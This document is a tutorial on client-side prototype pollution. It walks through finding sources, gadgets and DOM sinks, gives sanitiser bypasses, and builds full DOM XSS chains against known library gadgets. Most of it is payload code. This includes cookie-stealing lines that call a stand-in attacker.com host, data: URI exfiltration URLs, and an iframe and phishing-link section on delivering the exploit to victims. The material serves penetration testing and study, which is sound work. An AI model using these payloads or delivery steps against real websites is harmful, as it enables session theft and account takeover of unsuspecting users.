# Client-Side Prototype Pollution

Client-side prototype pollution occurs entirely within the victim's browser — the attacker pollutes `Object.prototype` via a URL parameter, fragment, or JSON input, and the pollution then flows into a DOM sink that executes arbitrary JavaScript. The difficulty is not in understanding the concept but in *finding* the three necessary components (source, gadget, sink) inside potentially thousands of lines of minified third-party library code. This guide covers both the manual methodology and the automated tooling workflow for real-world testing. 

**Fundamental principle: A client-side prototype pollution exploit is always a three-step chain — find a URL/input that writes to `Object.prototype` (the source), find a property the application reads but never sets itself (the gadget), and confirm that property flows into a DOM execution sink (the sink). Every technique in this guide is about efficiently finding each of these three components.**

***

## Step 1: Finding Prototype Pollution Sources

### Manual Source Testing

```javascript
// ── GOAL: Confirm that user-controlled input writes to Object.prototype ───────

// Method 1: Bracket notation in query string
// https://vulnerable-website.com/?__proto__[foo]=bar
// Open browser DevTools console:
Object.prototype.foo        // "bar"  → SOURCE CONFIRMED ✓
                            // undefined → try another notation

// Method 2: Dot notation in query string
// https://vulnerable-website.com/?__proto__.foo=bar
Object.prototype.foo        // "bar"  → SOURCE CONFIRMED ✓

// Method 3: URL fragment (hash) — not sent to server, purely client-side
// https://vulnerable-website.com/#__proto__[foo]=bar
Object.prototype.foo        // "bar" ✓

// Method 4: Nested bracket notation (multi-level)
// https://vulnerable-website.com/?__proto__[nested][foo]=bar
Object.prototype.nested     // {foo: "bar"} ✓

// Method 5: constructor.prototype bypass (for filters that block __proto__)
// https://vulnerable-website.com/?constructor[prototype][foo]=bar
Object.prototype.foo        // "bar" ✓  (same effect, different path)

// Method 6: JSON input (POST body, web message, localStorage)
// {"__proto__": {"foo": "bar"}}
Object.prototype.foo        // "bar" ✓


// ── VERIFICATION: What to check in the console after injecting ────────────────

// Check 1: Was Object.prototype polluted?
Object.prototype.foo
// "bar"  → polluted ✓
// undefined → not polluted (wrong notation, or source doesn't exist)

// Check 2: Confirm it was inherited (not just an own property of a specific object)
const testObj = {};
testObj.foo
// "bar"  → inherited from prototype ✓  (proves it's a genuine pollution, not local assignment)

// Check 3: Ensure the property is on Object.prototype, not some other object
Object.prototype.hasOwnProperty('foo')
// true  → confirms the pollution is on Object.prototype specifically ✓

// ── COMMON SOURCE PATTERNS IN REAL-WORLD APPS ────────────────────────────────

// Pattern A: URL router that parses query params into a config object
// app.js:
const params = new URLSearchParams(window.location.search);
const config = {};
params.forEach((value, key) => {
    setNestedProperty(config, key, value);  // ← if setNestedProperty uses __proto__
});
// Inject: ?__proto__[foo]=bar → config["__proto__"]["foo"] → Object.prototype.foo ✓

// Pattern B: Hash-based router
// router.js:
const hash = window.location.hash.slice(1);
const settings = parseHash(hash);          // ← if parseHash merges into object
merge(appState, settings);                 // ← if merge is unsafe

// Pattern C: postMessage handler
window.addEventListener('message', (event) => {
    const data = JSON.parse(event.data);
    merge(config, data);                   // ← data contains __proto__
});
// → Attacker iframe sends: targetWindow.postMessage('{"__proto__":{"foo":"bar"}}', '*')

// Pattern D: JSON loaded from localStorage or sessionStorage
const preferences = JSON.parse(localStorage.getItem('userPrefs') || '{}');
merge(appConfig, preferences);
// → If attacker can write to localStorage (via XSS or browser extension) ✓
```

### Automated Source Detection with DOM Invader

```
DOM Invader Setup (Burp Suite built-in browser):
─────────────────────────────────────────────────────────────────────────────
1. Open Burp's built-in browser (Proxy → Intercept → Open Browser)
2. Click the DOM Invader icon (top right, looks like a crosshair)
3. Toggle "DOM Invader" ON
4. In Attack Types: enable "Prototype pollution"
5. Navigate to the target website
6. DOM Invader automatically:
   → Injects canary properties via all detected input vectors
     (URL query, URL fragment, JSON inputs, postMessage, etc.)
   → Monitors Object.prototype to detect when canary is found
   → Reports confirmed sources in the DOM Invader panel ✓

7. Open DevTools → "DOM Invader" tab → review detected sources:
   Source: URL query string (?__proto__[foo]=bar)
   Property: foo
   Value: bar
   Confirmed: ✓

Advantages over manual testing:
  ✓ Tests ALL input vectors simultaneously
  ✓ Detects indirect sources (e.g., the app reads from a subpath, not directly __proto__)
  ✓ Handles async page loading (tests after DOMContentLoaded and after 2s delay)
  ✓ Tries both bracket and dot notation automatically
  ✓ Reports which specific URL parameter or input triggered the pollution
```

***

## Step 2: Finding Gadgets

### Manual Gadget Hunting

```javascript
// ── GOAL: Find a property that the app reads from an object but never sets ────
// These properties are "gadgets" because if inherited from a polluted prototype,
// they will carry the attacker's value into application logic.

// ── Phase 1: Read the source code (app + imported libraries) ─────────────────

// In browser DevTools → Sources tab → look for:
//   config.X || defaults.X    ← X might be unset → gadget candidate ✓
//   options[key]              ← dynamic property access → gadget candidate ✓
//   element.setAttribute(gadget, ...) ← attribute set from config ← potential sink ✓

// Known gadget patterns (from real-world library audits):

// Pattern 1: Script src injection gadget
let transport_url = config.transport_url || defaults.transport_url;
const script = document.createElement('script');
script.src = transport_url + '/bundle.js';     // ← SINK: script.src
document.body.appendChild(script);
// Gadget: transport_url (if config doesn't have it as own property)
// Sink: script.src → arbitrary script loading → XSS ✓

// Pattern 2: eval() / setTimeout with string gadget
const callback = config.callback || 'defaultHandler()';
setTimeout(callback, 0);                       // ← SINK: setTimeout(string)
// Gadget: callback
// Sink: setTimeout evaluates strings as JS code → XSS ✓

// Pattern 3: innerHTML gadget (HTML injection / XSS)
const tpl = options.template || '<div>default</div>';
container.innerHTML = tpl;                     // ← SINK: innerHTML
// Gadget: template
// Sink: innerHTML → script injection or event handler injection ✓

// Pattern 4: href / location gadget
const redirect = settings.redirectUrl;
if (redirect) window.location = redirect;      // ← SINK: location assignment
// Gadget: redirectUrl → javascript: URI → XSS ✓

// ── Phase 2: Use debugger + Object.defineProperty to trace property access ─────

// Step 1: In Burp, intercept the response containing the target JS file.
// Step 2: Insert debugger statement at the top of the script:
debugger;  // ← insert this at line 1
// → Script execution halts here → you can inject into Object.prototype before app runs

// Step 3: While paused at debugger, in console:
Object.defineProperty(Object.prototype, 'transport_url', {
    get() {
        console.trace();             // ← log a stack trace every time this is accessed
        return 'POLLUTED';           // ← return a test value
    },
    configurable: true               // ← allows later removal if needed
});
// → This creates a property getter on Object.prototype
// → Every time ANY code reads .transport_url from any object that doesn't have it as own:
//   → getter fires → stack trace logged → reveals WHERE in the code it's accessed ✓

// Step 4: Resume script execution (F8 or click Continue)
// → Monitor the console for stack traces

// Step 5: Expand a stack trace → click the source link → examine the code:
//   script.src = config.transport_url + '/track.js'
//   ↑ config doesn't have transport_url as own property
//   → reads from prototype → getter fires → value "POLLUTED" assigned to script.src ✓

// Step 6: Step through the code using debugger controls:
//   F10 (step over), F11 (step into), Shift+F11 (step out)
//   → Follow the value from the gadget read → confirm it reaches a sink
//   → document.body.appendChild(script) → script.src = "POLLUTED/track.js" → sink confirmed ✓
```

### Using DOM Invader for Gadget Scanning

```
DOM Invader Gadget Scan Workflow:
─────────────────────────────────────────────────────────────────────────────
1. After confirming a source (from Step 1 above):
   → DOM Invader panel → click "Scan for gadgets"

2. DOM Invader performs:
   a. Pollutes Object.prototype with a canary value for each candidate property
      (drawn from a built-in list of known gadgets: transport_url, innerHTML,
       hitCallback, onComplete, callback, src, href, action, ...)
   b. Executes the application's JavaScript
   c. Monitors all DOM sinks (innerHTML, script.src, eval, setTimeout, etc.)
   d. Detects when the canary value reaches a sink

3. Results panel shows:
   Source: ?__proto__[transport_url]=CANARY
   Gadget: transport_url
   Sink: HTMLScriptElement.src
   Value at sink: "CANARY/example.js"
   → Click "Exploit" → DOM Invader generates and tests a working XSS payload ✓

4. Verify the generated payload in the browser:
   https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(document.domain);//
   → alert() fires → DOM XSS confirmed ✓

Benefits for third-party libraries:
  → Minified/obfuscated code (e.g., analytics.min.js) is unreadable manually
  → DOM Invader instruments all property accesses automatically
  → Finds gadgets in jQuery, Lodash, Bootstrap, custom analytics — all at once
  → No need to deobfuscate or manually read thousands of lines ✓
```

***

## Sanitisation Bypasses

### `__proto__` String Filter Bypass

```
─────────────────────────────────────────────────────────────────────────────
VULNERABLE SANITISATION: Single-pass __proto__ stripping
─────────────────────────────────────────────────────────────────────────────

// Weak sanitisation code (strips __proto__ once, non-recursively):
function sanitizeKey(key) {
    return key.replace('__proto__', '');   // ← single replacement ✗
}

// BYPASS: Embed __proto__ inside itself
Input key:   __pro__proto__to__
After strip: __proto__           ← __proto__ reassembles after inner removal ✓

// URL payload with bypass:
https://vulnerable-website.com/?__pro__proto__to__[foo]=bar
// After sanitisation: ?__proto__[foo]=bar → pollution succeeds ✓

// More aggressive embedding (for double-pass sanitisers):
__pro__pro__proto__to__to__
// After 1 pass: __pro__proto__to__
// After 2 pass: __proto__              ← still reassembles ✓

// For sanitisers that strip both __proto__ and constructor.prototype:
// Use quadruple embedding:
__pro__proto__to__.gadget=payload         // bypasses single-pass __proto__ filter
constructor[pro__proto__totype][foo]=bar  // bypasses constructor+prototype filter

// Always test with the specific bypass character case too:
__PROTO__        // case-insensitive filter?
__Proto__        // mixed case?
%5F%5Fproto%5F%5F  // URL-encoded underscores
```

### `constructor.prototype` Path (Bypasses `__proto__` Filters Entirely)

```javascript
// ── ALTERNATIVE PATH: Does not use __proto__ string at all ────────────────────

// Every object has a constructor property that references the function
// that created it. Every constructor function has a prototype property
// that references the prototype of objects it creates.
// → myObj.constructor.prototype === myObj.__proto__ === Object.prototype

// Exploitation via URL:
// https://vulnerable-website.com/?constructor[prototype][foo]=bar

// In the merge function:
merge({}, { constructor: { prototype: { foo: "bar" } } });

// Trace through the merge:
// key = "constructor" → recurse into target.constructor (= Object constructor function)
// key = "prototype"   → recurse into Object.constructor.prototype (= Object.prototype!)
// key = "foo"         → Object.prototype.foo = "bar"  ✓

// Verification:
Object.prototype.foo    // "bar" ✓

// In JSON input:
{
    "constructor": {
        "prototype": {
            "isAdmin": true,
            "transport_url": "//attacker.com"
        }
    }
}

// URL format variations:
/?constructor[prototype][transport_url]=//attacker.com
/?constructor.prototype.transport_url=//attacker.com
/?constructor%5Bprototype%5D%5Btransport_url%5D=//attacker.com   // URL-encoded brackets

// ── Why this bypasses __proto__ filters ───────────────────────────────────────
// Filter: if (key === '__proto__') continue;
// → "constructor" is NOT "__proto__" → passes ✓
// → "prototype" is NOT "__proto__" → passes ✓
// → Object.prototype gets polluted ✓
```

***

## Exploitation: Building the Full DOM XSS Chain

```javascript
// ── CONFIRMED CHAIN: URL source → transport_url gadget → script.src sink ─────

// Source confirmation:
// https://vulnerable-website.com/?__proto__[transport_url]=test
// DevTools console: Object.prototype.transport_url  →  "test" ✓

// Gadget confirmation (in searchLogger.js):
let config = { params: new URLSearchParams(window.location.search) };
let transport_url = config.transport_url || defaults.transport_url;
// config has no own transport_url → inherits from prototype ✓

// Sink confirmation:
let script = document.createElement('script');
script.src = `${transport_url}/logger.js`;      // ← script.src = attacker-controlled ✓
document.body.appendChild(script);

// ── EXPLOIT PAYLOADS ──────────────────────────────────────────────────────────

// Payload 1: External script host (requires attacker-controlled server)
// https://vulnerable-website.com/?__proto__[transport_url]=//attacker.com
// → script.src = "//attacker.com/logger.js"
// → Browser loads attacker.com/logger.js → executes any JS ✓
// Attacker's logger.js:
fetch('https://attacker.com/steal?cookie=' + document.cookie);

// Payload 2: data: URI (no external server needed — self-contained)
// https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(document.domain);//
// → script.src = "data:,alert(document.domain);///logger.js"
// → data:,alert(document.domain); executes immediately ✓
// → // comments out the /logger.js suffix ✓

// Payload 3: data: URI with full cookie exfiltration
// https://vulnerable-website.com/?__proto__[transport_url]=data:,fetch(`//attacker.com?c=${document.cookie}`);//
// → Exfiltrates cookies via fetch to attacker's server ✓

// Payload 4: Alternative sink via innerHTML gadget
// https://vulnerable-website.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
// → config.innerHTML = '<img src=x onerror=alert(1)>'
// → element.innerHTML = config.innerHTML → XSS fires ✓

// Payload 5: Sanitisation bypass + data: URL
// https://vulnerable-website.com/?__pro__proto__to__[transport_url]=data:,alert(1);//
// → After non-recursive strip: ?__proto__[transport_url]=data:,alert(1);// ✓


// ── DELIVER EXPLOIT TO VICTIM ─────────────────────────────────────────────────

// Method 1: Direct link (social engineering / phishing)
// Just send the crafted URL — victim visits it → XSS fires automatically ✓
// No interaction required beyond page load

// Method 2: Iframe embed (from attacker-controlled page)
<iframe src="https://vulnerable-website.com/?__proto__[transport_url]=data:,fetch(`//attacker.com?c=${document.cookie});//"></iframe>
// → Victim visits attacker's page → iframe loads vulnerable site → XSS fires ✓

// Method 3: Script tag auto-submission (for form-based sources)
<script>
window.location = "https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(document.domain);//";
</script>
```

***

## Real-World Third-Party Library Gadgets

```javascript
// ── jQuery ($.extend deep merge — affects versions before patch) ──────────────
// Gadget: passed through $.extend(true, {}, userInput)
// Source: vulnerable-website.com/?__proto__[src]=//attacker.com
// → jQuery reads src when building elements → script injection ✓

// ── Lodash (_.merge / _.defaultsDeep — CVE-2019-10744 and others) ────────────
_.merge({}, JSON.parse('{"__proto__":{"polluted":true}}'));
// Object.prototype.polluted → true ✓
// Gadget depends on how the app uses lodash results

// ── Google Analytics / Tracking libraries ─────────────────────────────────────
// Many analytics scripts read config.transport_url, config.endpoint, config.callback
// These are often not explicitly set by the developer → gadgets ✓
// DOM Invader identifies these automatically ✓

// ── DOMPurify sanitiser bypass (prototype pollution before load) ──────────────
// If prototype is polluted BEFORE DOMPurify initialises:
// DOMPurify reads allowed tags/attributes from its config object
// Pollution can inject attacker-controlled allowed attributes:
Object.prototype['ALLOWED_ATTR'] = ['onerror', 'src'];
// → DOMPurify allows onerror attribute on all elements
// → <img src=x onerror=alert(1)> passes sanitisation → XSS ✓ [web:261]

// ── Custom hitCallback gadget (PortSwigger research — widespread) ─────────────
// Source: /#__proto__[hitCallback]=alert(1)
// Library code (Pixel/tracking lib):
if (typeof config.hitCallback === 'function') {
    config.hitCallback();              // ← calls inherited function → code execution ✓
} else if (typeof config.hitCallback === 'string') {
    setTimeout(config.hitCallback, 0); // ← string eval → XSS ✓
}
// Pollution: Object.prototype.hitCallback = "alert(document.cookie)"
// → config inherits hitCallback → setTimeout("alert(document.cookie)", 0) → XSS ✓ [web:258]
```

***
